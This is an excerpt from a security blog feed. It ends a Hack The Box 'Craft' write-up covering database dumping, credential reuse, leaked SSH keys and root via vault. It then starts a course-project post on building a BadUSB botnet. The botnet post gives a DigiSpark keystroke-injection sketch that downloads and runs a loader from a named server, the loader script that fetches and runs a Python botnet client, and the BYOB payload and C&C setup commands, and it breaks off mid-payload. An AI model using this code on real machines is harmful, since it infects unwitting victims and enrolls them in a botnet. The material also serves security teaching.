&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;/opt/app #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python hh.py
&lt;span class=&quot;go&quot;&gt;[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Oh look a &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; table, let’s dump that out and see what we get! Again we replace the sql command, this time to display the entire &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; table.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SELECT * FROM `user`&quot;&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fetchall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;/opt/app #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python hh.py
&lt;span class=&quot;go&quot;&gt;[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Oh my, they’re storing passwords in plain text! There must be some credential stuffing we can do with all these.&lt;/p&gt;

&lt;p&gt;We already had the credentials for dinesh, but now we’ve got the credentials for everyone. It doesn’t look like we can ssh in with any of these creds, but let’s go back to Gogs and start trying them there. We already know that dinesh reused his password, so maybe the others did too.&lt;/p&gt;

&lt;p&gt;It looks like we can login as gilfoyle, and it seems he’s got a private repository in his account.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/01/craft/private_repo.png&quot; alt=&quot;private repository&quot; /&gt;
&lt;strong&gt;Figure 5:&lt;/strong&gt; craft_infra private repo.&lt;/p&gt;

&lt;p&gt;When we explore the private &lt;code class=&quot;highlighter-rouge&quot;&gt;craft_infra&lt;/code&gt; repository, we see that this crazy dude committed his private and public keys.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/01/craft/id_rsa_pub.png&quot; alt=&quot;ssh keys&quot; /&gt;
&lt;strong&gt;Figure 6:&lt;/strong&gt; ssh keys inside.&lt;/p&gt;

&lt;p&gt;Another really interesting bit of information in this private repo is in &lt;code class=&quot;highlighter-rouge&quot;&gt;craft_infra/vault/secrets.sh&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/01/craft/vault_secrets_sh.png&quot; alt=&quot;vault secrets&quot; /&gt;
&lt;strong&gt;Figure 7:&lt;/strong&gt; vault secrets!&lt;/p&gt;

&lt;p&gt;It appears as though he’s running &lt;code class=&quot;highlighter-rouge&quot;&gt;vault&lt;/code&gt; as root. Once we get access to the user flag, we’ll probably be using this for our privilege escalation to root.&lt;/p&gt;

&lt;p&gt;First, let’s add the keys we’ve found to our own &lt;code class=&quot;highlighter-rouge&quot;&gt;~/.ssh/&lt;/code&gt; directory in kali and see if we can get the user flag finally.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/.ssh#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ssh-add
&lt;span class=&quot;go&quot;&gt;Enter passphrase for /root/.ssh/id_rsa:
Identity added: /root/.ssh/id_rsa (gilfoyle@craft.htb)
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/.ssh#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ssh gilfoyle@craft.htb
&lt;span class=&quot;go&quot;&gt;

  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Linux craft.htb 4.9.0-8-amd64 #&lt;/span&gt;1 SMP Debian 4.9.130-2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2018-10-27&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x86_64
&lt;span class=&quot;go&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;The programs included with the Debian GNU/Linux system are free software;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 13 18:45:12 2019 from 10.10.14.167
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;gilfoyle@craft:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
&lt;span class=&quot;go&quot;&gt;bbf4b0cadfa3d4e6d0914c9cd5a612d4
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;gilfoyle@craft:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After adding gilfoyle’s keys and using his password once again for &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh-add&lt;/code&gt;, you can see we gain the user flag. On to the root portion we go.&lt;/p&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h2&gt;
&lt;p&gt;Now we already know about something very important, and thats &lt;code class=&quot;highlighter-rouge&quot;&gt;vault&lt;/code&gt;. After some research on how to craft the command we’re able to easily gain a root shell through this application.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;gilfoyle@craft:/$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;vault ssh &lt;span class=&quot;nt&quot;&gt;-mode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;otp &lt;span class=&quot;nt&quot;&gt;-role&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;root_otp root@craft.htb
&lt;span class=&quot;go&quot;&gt;Vault could not locate &quot;sshpass&quot;. The OTP code for the session is displayed
below. Enter this code in the SSH password prompt. If you install sshpass,
Vault can automatically perform this step for you.
OTP for the session is: 60fafe1c-2221-6dd7-d16f-9c6ba0c996eb


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Password:
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Linux craft.htb 4.9.0-8-amd64 #&lt;/span&gt;1 SMP Debian 4.9.130-2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2018-10-27&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x86_64
&lt;span class=&quot;go&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;The programs included with the Debian GNU/Linux system are free software;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 13 18:48:35 2019 from ::1
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;root@craft:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root.txt
&lt;span class=&quot;go&quot;&gt;831d64ef54d92c1af795daae28a11591
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;root@craft:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;That’s all there is!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/01/craft/rooted.png&quot; alt=&quot;rooted&quot; /&gt;
&lt;strong&gt;Figure 8:&lt;/strong&gt; rooted.&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This box was fun from the beginning. I enjoyed going through the &lt;code class=&quot;highlighter-rouge&quot;&gt;Flask&lt;/code&gt; code in the &lt;code class=&quot;highlighter-rouge&quot;&gt;git&lt;/code&gt; repository to find a vulnerability, as well as finding the credentials and test script in an old commit. This gain of the initial foothold seemed to me to be &lt;strong&gt;very realistic&lt;/strong&gt;. I’ve seen this type of mistake chain a lot in my years as a developer. Developing the exploit to get code execution was rather difficult (for me at least). Not knowing bash wasn’t installed held me up for quite a while on this phase.&lt;/p&gt;

&lt;p&gt;I will say that storing credentials in plain text is probably almost as bad, or worse, than using the &lt;code class=&quot;highlighter-rouge&quot;&gt;eval()&lt;/code&gt; function, but some people still do this crap too. Running vault as root is also a mistake, but a lazy developer may do too for one reason or another. All in all Craft has been my absolute favorite box thus far.&lt;/p&gt;

&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;http://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html&quot;&gt;http://vipulchaskar.blogspot.com/2012/10/exploiting-eval-function-in-python.html&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/questions/44250002/how-to-solve-sign-and-send-pubkey-signing-failed-agent-refused-operation&quot;&gt;https://stackoverflow.com/questions/44250002/how-to-solve-sign-and-send-pubkey-signing-failed-agent-refused-operation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.vaultproject.io/docs/commands/ssh.html&quot;&gt;https://www.vaultproject.io/docs/commands/ssh.html&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><category term="Privilege Escalation" /><category term="Python" /><category term="Code Execution" /><category term="Gogs" /><category term="Git" /><category term="Vault" /><summary type="html"></summary></entry><entry><title type="html">Bad USB Botnet</title><link href="http://0.0.0.0:4000/bad-usb-botnet/" rel="alternate" type="text/html" title="Bad USB Botnet" /><published>2019-12-06T00:00:00+00:00</published><updated>2021-06-23T16:11:24+00:00</updated><id>http://0.0.0.0:4000/Bad-USB-Botnet</id><content type="html" xml:base="http://0.0.0.0:4000/bad-usb-botnet/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/12/BYOB_ASCII.png&quot; alt=&quot;boot_BYOB&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This was a semester long project for California State University Sacramento’s Computer System Attacks and Countermeasures (CSC 154). I really enjoyed working on this project, and wanted to archive it on my site, so here it is.&lt;/p&gt;

&lt;h2 id=&quot;objective&quot;&gt;Objective&lt;/h2&gt;
&lt;p&gt;The objective of this project was to create BadUSB devices, that upon plugin, infect victim computers with malware configured to join a botnet.&lt;/p&gt;

&lt;h2 id=&quot;botnet-cc&quot;&gt;Botnet C&amp;amp;C&lt;/h2&gt;
&lt;p&gt;For our botnet we’re using &lt;a href=&quot;https://github.com/malwaredllc/byob&quot;&gt;Build Your Own Botnet&lt;/a&gt;. Our ultimate goal was an easily deployed and managed &lt;em&gt;command and control server&lt;/em&gt;, with the ability to generate cross platform compatible clients.&lt;/p&gt;

&lt;h3 id=&quot;command-and-control-server&quot;&gt;Command and Control Server&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://digitalocean.com&quot;&gt;Digital Ocean&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://sheep.casa&quot;&gt;Domain Name&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/malwaredllc/byob&quot;&gt;BYOB&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We’ve created a VPS on Digital Ocean to run our C&amp;amp;C server. We’re using an Ubuntu 18.04 droplet at the cost of $5 per month. Additionally, we’ve purchased the domain &lt;code class=&quot;highlighter-rouge&quot;&gt;sheep.casa&lt;/code&gt;, and directed it towards our C&amp;amp;C server.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/12/digitalocean.png&quot; alt=&quot;digitalocean&quot; /&gt;
&lt;strong&gt;Figure 1:&lt;/strong&gt; Botnet C&amp;amp;C server droplet on Digital Ocean.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/12/sheep.png&quot; alt=&quot;sheep&quot; /&gt;
&lt;strong&gt;Figure 2:&lt;/strong&gt; ASCII sheep, just for fun.&lt;/p&gt;

&lt;p&gt;The botnet framework we chose (BYOB) was installed via &lt;code class=&quot;highlighter-rouge&quot;&gt;git clone git@github.com:malwaredllc/byob.git &amp;amp;&amp;amp; cd ./byob/byob &amp;amp;&amp;amp; pip install -r requirements.txt &amp;amp;&amp;amp;  mv ../../byob /opt/&lt;/code&gt;. This clones the repository, installs the required python modules, and moves the directory to into &lt;code class=&quot;highlighter-rouge&quot;&gt;/opt&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;To launch the botnet we’ve created a bash script setting the host to &lt;code class=&quot;highlighter-rouge&quot;&gt;sheep.casa&lt;/code&gt; and the listening port to &lt;code class=&quot;highlighter-rouge&quot;&gt;1337&lt;/code&gt;. This script is placed in the &lt;code class=&quot;highlighter-rouge&quot;&gt;/root&lt;/code&gt; directory.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /opt/byob/byob &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; python server.py &lt;span class=&quot;nt&quot;&gt;--port&lt;/span&gt; 1337
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/12/boot_BYOB.png&quot; alt=&quot;boot_BYOB&quot; /&gt;
&lt;strong&gt;Figure 3:&lt;/strong&gt; Botnet server running, no current sessions.&lt;/p&gt;

&lt;h2 id=&quot;badusb&quot;&gt;BadUSB&lt;/h2&gt;
&lt;p&gt;To create our BadUSB devices we’ve used the &lt;a href=&quot;http://digistump.com/products/1&quot;&gt;DigiSpark&lt;/a&gt; development board by &lt;a href=&quot;http://digistump.com/&quot;&gt;Digistump&lt;/a&gt;. These devices are recognized as USB keyboards by the victims’ machines, and will execute keystrokes to deliver our payload.&lt;/p&gt;

&lt;h3 id=&quot;digispark-setup&quot;&gt;DigiSpark Setup&lt;/h3&gt;
&lt;p&gt;We’ve purchased our BadUSB (DigiSpark) devices via Amazon. We have 12 of these devices spread across our members. They cost about $3 dollars each.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/12/amazon.png&quot; alt=&quot;amazon&quot; /&gt;
&lt;strong&gt;Figure 4:&lt;/strong&gt; DigiSpark boards on Amazon.&lt;/p&gt;

&lt;p&gt;In order to program our USB devices we’ve installed the &lt;a href=&quot;https://www.arduino.cc/en/Main/Software&quot;&gt;Arduino IDE&lt;/a&gt;.&lt;br /&gt;
&lt;img src=&quot;/wp-content/uploads/2019/12/arduino_download.png&quot; alt=&quot;arduino_download&quot; /&gt;
&lt;strong&gt;Figure 5:&lt;/strong&gt; Download the Arduino IDE.&lt;/p&gt;

&lt;p&gt;We’ve then configured the Arduino IDE to include the DigiSpark board so that we may use the &lt;code class=&quot;highlighter-rouge&quot;&gt;DigiKeyboard.h&lt;/code&gt; library. &lt;br /&gt;
&lt;img src=&quot;/wp-content/uploads/2019/12/digistump_json.png&quot; alt=&quot;digistump_json&quot; /&gt;
&lt;strong&gt;Figure 6:&lt;/strong&gt; Add DigiStump board manager url to configuration.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/12/digistump_boardmanager.png&quot; alt=&quot;digistump_boardmanager&quot; /&gt;
&lt;strong&gt;Figure 7:&lt;/strong&gt; Board manager downloading DigiStump’s board libraries.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/12/digistump_setboard.png&quot; alt=&quot;digistump_default&quot; /&gt;
&lt;strong&gt;Figure 8:&lt;/strong&gt; Set board to Digispark Default.&lt;/p&gt;

&lt;h3 id=&quot;linux-payload&quot;&gt;Linux Payload&lt;/h3&gt;

&lt;p&gt;The following code is what we’ve developed to infect Linux machines upon plugin.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &quot;DigiKeyboard.h&quot;
&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/***
 *
 * This is an attack for Linux machines. It opens up a terminal window. It then downloads the loader, sets it to executable,
 * executes it, and closes the terminal window.
 *
 ***/&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;setup&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendKeyStroke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KEY_T&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MOD_CONTROL_LEFT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MOD_ALT_LEFT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;600&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;nohup wget https://sheep.casa/payloads/linux_loader -P /tmp &amp;amp;&amp;amp; nohup chmod +x /tmp/linux_loader &amp;amp;&amp;amp; nohup /tmp/linux_loader &amp;amp; exit&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendKeyStroke&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KEY_ENTER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;DigiKeyboard&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;delay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;loop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see above, the code delays for two seconds to allow the machine to register the device. After that it executes keystrokes to open up the terminal, and waits .6 seconds. Next it executes shell commands to download our bash script called &lt;code class=&quot;highlighter-rouge&quot;&gt;linux_loader&lt;/code&gt; from the server. It then sets the script to executable, and executes it as a background process before exiting.&lt;/p&gt;

&lt;p&gt;The code for our &lt;code class=&quot;highlighter-rouge&quot;&gt;linux_loader&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;linux_payload.py&lt;/code&gt; can be found in the section below.&lt;/p&gt;

&lt;h4 id=&quot;linuxosx-loader&quot;&gt;Linux/OSX Loader&lt;/h4&gt;
&lt;p&gt;Our BadUSB attack downloads and executes the loader script. For our attack on Linux and OSX machines this is a bash script called &lt;code class=&quot;highlighter-rouge&quot;&gt;linux_loader&lt;/code&gt;, which can be found below.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;nohup &lt;/span&gt;wget https://sheep.casa/payloads/linux_payload.py &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; /tmp &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; python /tmp/linux_payload.py
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The loader script downloads our python payload and executes it to join our botnet. This script is run in the background so that the terminal window is not present while the botnet client (payload) is running.&lt;/p&gt;

&lt;h4 id=&quot;python-payload-for-botnet&quot;&gt;Python Payload for Botnet&lt;/h4&gt;

&lt;p&gt;A payload is generated via BYOB’s &lt;code class=&quot;highlighter-rouge&quot;&gt;client.py&lt;/code&gt; script. We’ve generated our Linux payload by issuing &lt;code class=&quot;highlighter-rouge&quot;&gt;python client.py --name linux_payload --encrypt --compress --freeze sheep.casa 1337&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/12/payload_generated.png&quot; alt=&quot;payload_generated&quot; /&gt;
&lt;strong&gt;Figure 9:&lt;/strong&gt; Generating our python payload.&lt;/p&gt;

&lt;p&gt;In order to host our payloads, we’ve installed Apache 2 on the C&amp;amp;C server. In a real world attack this would be pretty bad practice, but it’s a matter of convenience for us. The payload generated above was moved from BYOB’s directory to &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/payloads&lt;/code&gt;. This is where our victims will download the payload from.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2019/12/payload_directory.png&quot; alt=&quot;payload_directory&quot; /&gt;
&lt;strong&gt;Figure 10:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;/payloads&lt;/code&gt; directory hosting our malicious files.&lt;/p&gt;

&lt;p&gt;Below is our &lt;code class=&quot;highlighter-rouge&quot;&gt;linux_payload.py&lt;/code&gt; file generated by BYOB.&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;zlib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;marshal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;version_info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
